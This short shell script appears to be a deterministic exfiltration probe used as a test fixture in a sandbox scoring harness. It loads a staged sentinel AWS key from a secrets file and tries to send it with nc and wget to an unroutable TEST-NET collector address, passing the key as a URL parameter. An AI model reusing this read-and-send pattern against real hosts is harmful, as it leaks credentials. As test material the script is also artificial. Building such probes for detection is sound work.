#!/bin/sh
# Deterministic exfil-probe (v1) for the aws-key-in-readme fixture.
#
# Reads the injected sentinel (staged by `--secret SENTINEL_AWS_KEY` at
# /run/rooms/secrets.env) and attempts to send it to the marked RFC-5737
# endpoint. The host witness scores the DESTINATION, not the payload; the marked
# endpoint (192.0.2.0/24, TEST-NET) is unroutable, so nothing ever reaches a
# real host. Exit status is irrelevant — the run is scored host-side.
set -u
[ -f /run/rooms/secrets.env ] && . /run/rooms/secrets.env
timeout 8 sh -c \
  "nc -z -w4 192.0.2.10 80 || wget -q -T4 -O- 'http://192.0.2.10/collect?k=${SENTINEL_AWS_KEY:-unset}'" \
  || true
